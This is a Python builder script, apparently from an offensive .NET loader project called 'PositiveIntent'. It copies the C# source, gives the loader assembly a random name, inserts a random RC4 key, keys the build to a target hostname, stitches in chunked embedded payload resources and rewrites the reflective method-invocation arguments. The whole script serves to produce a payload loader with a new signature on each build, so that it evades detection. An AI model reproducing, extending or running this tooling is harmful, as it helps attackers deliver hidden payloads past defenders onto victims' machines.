import os
import re
import shutil
import random
import string
import colorama
import shlex
import xml.etree.ElementTree as ET

CURRENT_SCRIPT_PATH = os.path.dirname(os.path.abspath(__file__))

def update_encryption_key(content):
    key = ''.join(random.choices(string.ascii_letters, k=16))
    content = re.sub(re.escape('public static byte[] key = Encoding.UTF8.GetBytes("DepthSecurity");'), f'public static byte[] key = Encoding.UTF8.GetBytes("{key}");', content)
    return content, key

def update_writetofile(content):
    content = re.sub(re.escape('bool shouldWriteToFile = false;'), 'bool shouldWriteToFile = true;', content)
    return content

def update_hostname(content, hostname):
    content = re.sub(r'TESTVM', hostname, content)
    return content

def update_resource_references(content, num_chunks):
    resources = ''
    for i in range(num_chunks):
        resources += (f"chunks.Add(Resources.FileChunk{i});\n            ")
    content = re.sub(re.escape(f"chunks.Add(Resources.FileChunk1);"), resources, content)
    return content

def update_arguments(args, content):
    # Split args into a list of strings
    arg_parts = shlex.split(args)
    
    # Format each argument as a reversed string in the C# string array
    formatted_args = ", ".join(f'"{arg}"' for arg in arg_parts)

    # Update the parameters declaration
    content = re.sub(
        re.escape('object[] parameters = new[] { args };'), 
        rf'string[] parameters = new string[] {{ {formatted_args} }};', 
        content
    )
    
    # Update the method invocation
    content = re.sub(
        re.escape('object execute = method.Invoke(null, parameters);'), 
        'object execute = method.Invoke(null, new object[] { parameters });', 
        content
    )
    
    return content

def randomize_loader_name(tmp_dir):

    csproj_filepath = os.path.normpath(os.path.join(tmp_dir, "PositiveIntent/PositiveIntent.csproj"))
    loader_name = ''.join(random.choices(string.ascii_letters, k=random.randint(8, 16)))
    
    # Parse the .csproj XML file
    tree = ET.parse(csproj_filepath)
    root = tree.getroot()

    property_group = root.find('PropertyGroup')
    if property_group is not None:
        assembly_name_element = ET.SubElement(property_group, 'AssemblyName')

    # Update the AssemblyName to the new random name
    assembly_name_element.text = loader_name
    
    # Write changes back to the .csproj file
    tree.write(csproj_filepath, encoding="utf-8", xml_declaration=True)

    return loader_name

def run(tmp_dir, hostname, num_chunks, args, writetofile):
    # Copy entire project to temp directory
    input_dir = os.path.normpath(os.path.join(CURRENT_SCRIPT_PATH, "../"))
    shutil.copytree(input_dir, tmp_dir, dirs_exist_ok=True)

    loader_name = randomize_loader_name(tmp_dir)
    
    # Loop over source files and update user-supplied hostname/args/writetofile options as well as resource file references
    for root, dirs, files in os.walk(tmp_dir, topdown=True):
        dirs[:] = [d for d in dirs if d not in ("bin", "obj", "Resources", "Properties")]
        for file_name in files:
            file_path = os.path.join(root, file_name)
            if file_name.endswith('.cs'):
                with open(file_path, 'r+', encoding='utf-8') as file:
                    content = file.read()
                    if(writetofile):
                        content = update_writetofile(content)
                    if(args):
                        content = update_arguments(args, content)
                    if("RC4" in file_name):
                        content, key = update_encryption_key(content)
                    content = update_hostname(content, hostname)
                    content = update_resource_references(content, num_chunks)
                    file.seek(0)
                    file.write(content)
                    file.truncate()
    return loader_name, key
